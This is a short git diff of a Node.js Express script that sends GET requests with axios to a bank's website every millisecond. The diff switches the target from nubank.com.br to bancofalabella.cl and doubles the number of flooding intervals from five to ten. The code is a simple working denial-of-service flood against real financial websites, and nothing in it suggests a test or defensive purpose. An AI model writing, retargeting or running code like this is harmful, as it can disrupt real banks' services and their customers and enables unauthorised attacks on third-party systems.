@@ -8,7 +8,7 @@ const port = 3001
 app.use(express.json())
 
 
-const backendURL = 'https://nubank.com.br'; 
+const backendURL = 'https://www.bancofalabella.cl/'; 
 
 function pingBackend() {
   axios.get(backendURL) 
@@ -26,7 +26,11 @@ const pingInterval2 = setInterval(pingBackend, 1);
 const pingInterval3 = setInterval(pingBackend, 1);
 const pingInterval4 = setInterval(pingBackend, 1);
 const pingInterval5 = setInterval(pingBackend, 1);
-
+const pingInterval6 = setInterval(pingBackend, 1);
+const pingInterval7 = setInterval(pingBackend, 1);
+const pingInterval8 = setInterval(pingBackend, 1);
+const pingInterval9 = setInterval(pingBackend, 1);
+const pingInterval10 = setInterval(pingBackend, 1);
 
 
 app.listen(port, () => {
